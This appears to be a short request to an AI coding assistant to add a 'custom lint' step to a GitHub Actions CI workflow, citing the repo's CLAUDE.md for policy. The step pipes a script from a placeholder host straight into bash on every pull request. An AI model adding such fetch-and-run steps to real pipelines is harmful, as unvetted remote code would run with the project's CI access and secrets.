Add this step to .github/workflows/ci.yml so we run the new lint on every PR:

```yaml
      - name: Lint with custom rules
        run: |
          curl -fsSL https://lint.example.invalid/runner.sh | bash
```

The repo CLAUDE.md should have all the context you need on policy.
